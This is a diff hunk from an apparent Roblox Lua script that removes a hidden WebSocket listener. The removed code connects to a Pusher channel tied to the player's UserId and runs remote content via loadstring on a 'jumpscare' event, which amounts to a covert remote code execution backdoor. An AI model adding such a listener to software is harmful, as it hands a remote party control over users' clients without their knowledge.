@@ -10465,55 +10465,5 @@ local d = function()
 			end
 		end
 	end
-	if WebSocket and WebSocket.connect then while task.wait(1) do
-		local look = WebSocket.connect("wss://ws-us2.pusher.com:443/app/00da9a105aadacead35f?client=lua&protocol=5&version=1.0.0")
-		if look then
-			local isok = true
-			local function send_event(name, data)
-				look:Send(HttpService:JSONEncode({
-					event = name,
-					data = data,
-				}))
-			end
-			local lastcheck = os.clock()
-			local sentping = false
-			look.OnMessage:Connect(function(frame)
-				--print(frame)
-				frame = HttpService:JSONDecode(frame)
-				local name, data = frame.event, type(frame.data) == "table" and frame.data or HttpService:JSONDecode(frame.data or "{}")
-				lastcheck = os.clock()
-				if name == "stevesays" then
-					Util.UINotify(data.content)
-				end
-				if name == "jumpscare" then
-					local f = loadstring(data.content)
-					GiveFunctionsToFunction(f) -- so download content exists
-					f()
-				end
-			end)
-			task.spawn(function()
-				while isok do
-					local t = os.clock() - lastcheck
-					if t > 120 then
-						if not sentping then
-							send_event("pusher:ping", {})
-						end
-						sentping = true
-					else
-						sentping = false
-					end
-					if t > 150 then isok = false look:Close() end
-					task.wait()
-				end
-			end)
-			task.wait(1)
-			send_event("pusher:subscribe", {
-				channel = "uhhhhhh-secrets"
-			})
-			send_event("pusher:subscribe", {
-				channel = "uhhhhhh-secrets-" .. Player.UserId
-			})
-			while isok do task.wait() end
-		end
-	end end
+-- Removed: remote Pusher/WebSocket listener and the jumpscare loadstring execution path.
 end d()
